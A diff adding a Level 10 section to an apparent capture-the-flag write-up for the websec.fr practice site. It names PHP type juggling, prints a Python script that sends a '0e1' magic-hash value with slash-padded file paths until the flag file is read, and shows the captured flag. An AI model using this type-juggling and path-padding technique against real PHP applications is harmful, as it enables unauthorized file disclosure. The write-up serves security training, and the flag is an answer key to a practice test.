@@ -60,6 +60,30 @@ echo file_get_contents('flag.txt');
 WEBSEC{BypassingImageChecksToRCE}
 ```
 
+## Level 10
+
+PHP Type Juggling
+
+```python
+#!/usr/bin/env python3
+import requests
+
+count = 1
+while True:
+    res = requests.get("http://websec.fr/level10/index.php?hash=0e1&f={}".format("." + count*"/" + "flag.php"))
+    if (res.text.find("WEBSEC{") != -1):
+        print(res.text)
+        print(count)
+        break
+    else:
+        count += 1
+        print(count, len(res.text))
+```
+
+```
+WEBSEC{Lose_typ1ng_system_are_super_great_aren't_them?}
+```
+
 ## Level 15
 
 create_function() uses eval
